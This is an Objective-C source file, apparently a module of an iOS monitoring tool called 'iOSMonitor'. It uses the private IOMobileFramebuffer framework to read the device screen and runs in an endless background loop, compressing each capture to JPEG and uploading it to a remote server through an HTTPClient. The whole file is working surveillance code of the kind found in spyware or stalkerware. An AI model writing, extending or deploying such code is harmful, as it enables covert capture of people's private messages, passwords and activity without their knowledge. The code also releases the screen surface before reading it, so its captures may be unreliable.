#import "include/monitor.h"
#import <dlfcn.h>
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>

typedef struct {
    void *data;
    size_t width;
    size_t height;
    size_t bytesPerRow;
} ScreenBuffer;

static BOOL captureScreenBuffer(ScreenBuffer *buf) {
    void *handle = dlopen("/System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_LAZY);
    if (!handle) return NO;

    CFTypeRef (*IOMobileFramebufferCreate)(CFAllocatorRef) = dlsym(handle, "IOMobileFramebufferCreate");
    int (*IOMobileFramebufferGetLayerDefaultSurface)(CFTypeRef, int, CFTypeRef *) = dlsym(handle, "IOMobileFramebufferGetLayerDefaultSurface");

    if (!IOMobileFramebufferCreate || !IOMobileFramebufferGetLayerDefaultSurface) {
        dlclose(handle);
        return NO;
    }

    CFTypeRef fb = IOMobileFramebufferCreate(kCFAllocatorDefault);
    if (!fb) { dlclose(handle); return NO; }

    CFTypeRef surface = NULL;
    int ret = IOMobileFramebufferGetLayerDefaultSurface(fb, 0, &surface);
    if (ret != 0 || !surface) {
        CFRelease(fb);
        dlclose(handle);
        return NO;
    }

    IOSurfaceRef iosurf = (IOSurfaceRef)surface;
    IOSurfaceLock(iosurf, 0, NULL);
    buf->data = IOSurfaceGetBaseAddress(iosurf);
    buf->width = IOSurfaceGetWidth(iosurf);
    buf->height = IOSurfaceGetHeight(iosurf);
    buf->bytesPerRow = IOSurfaceGetBytesPerRow(iosurf);
    IOSurfaceUnlock(iosurf, 0, NULL);

    CFRelease(fb);
    dlclose(handle);
    return YES;
}

@implementation ScreenCapture

- (void)startCaptureWithInterval:(NSTimeInterval)interval {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        while (YES) {
            @autoreleasepool {
                ScreenBuffer buf = {0};
                if (captureScreenBuffer(&buf) && buf.data && buf.width > 0 && buf.height > 0) {
                    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
                    CGContextRef ctx = CGBitmapContextCreate(
                        buf.data, buf.width, buf.height, 8, buf.bytesPerRow,
                        colorSpace, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little
                    );
                    if (ctx) {
                        CGImageRef cgImage = CGBitmapContextCreateImage(ctx);
                        if (cgImage) {
                            UIImage *image = [UIImage imageWithCGImage:cgImage];
                            NSData *jpegData = UIImageJPEGRepresentation(image, 0.6);
                            if (jpegData) {
                                [[HTTPClient sharedClient] postImage:@"screen_capture" imageData:jpegData];
                                NSLog(@"[iOSMonitor] Screen capture sent (%lu bytes)", (unsigned long)jpegData.length);
                            }
                            CGImageRelease(cgImage);
                        }
                        CGContextRelease(ctx);
                    }
                    CGColorSpaceRelease(colorSpace);
                }
            }
            [NSThread sleepForTimeInterval:interval];
        }
    });
    NSLog(@"[iOSMonitor] ScreenCapture started (interval: %.0fs)", interval);
}

@end
